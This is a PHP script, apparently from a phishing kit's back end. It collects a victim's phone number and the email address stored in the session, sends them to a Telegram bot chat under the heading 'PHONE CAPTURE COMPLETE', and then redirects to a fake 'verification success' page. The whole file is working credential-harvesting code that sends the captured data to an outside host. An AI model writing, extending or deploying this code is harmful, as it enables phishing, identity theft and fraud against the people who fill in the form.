<?php
// process_phone.php
// Receives the phone number, sends it to Telegram, and redirects to the final success page.

session_start();

// 1. Load Telegram Configuration
$config = require 'conexion.php'; 

if (!isset($config['telegram']['bot_token']) || !isset($config['telegram']['chat_id'])) {
    // Redirect to error page if configuration is missing
    header('Location: error_page.php?title=' . urlencode('System Error') . '&message=' . urlencode('Configuration failed. Please try later.'));
    exit;
}

$botToken = $config['telegram']['bot_token'];
$chatId = $config['telegram']['chat_id'];

// 2. Receive Data
$user_email = $_SESSION['logged_in_email'] ?? 'Unknown Email';
$code = $_POST['country_code'] ?? '';
$number = $_POST['phone_number'] ?? '';
$full_phone = trim($code . ' ' . $number); // Clean up the final phone number
$time = date('Y-m-d H:i:s');


// 3. Format Telegram Message
$message = "📞 ¡PHONE CAPTURE COMPLETE! 📞\n\n";
$message .= "👤 *User (Email):* " . htmlspecialchars($user_email) . "\n";
$message .= "📱 *Phone Number:* " . htmlspecialchars($full_phone) . "\n";
$message .= "⏰ *Time:* " . $time . "\n";

$encodedMessage = urlencode($message);

// 4. Construct Telegram API URL
$telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$encodedMessage}&parse_mode=Markdown";

// 5. Send to Telegram (asynchronous)
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_exec($ch);
curl_close($ch);

// 6. Final Redirection to the success page with the popup
header('Location: verification_success.php?success=true');
exit;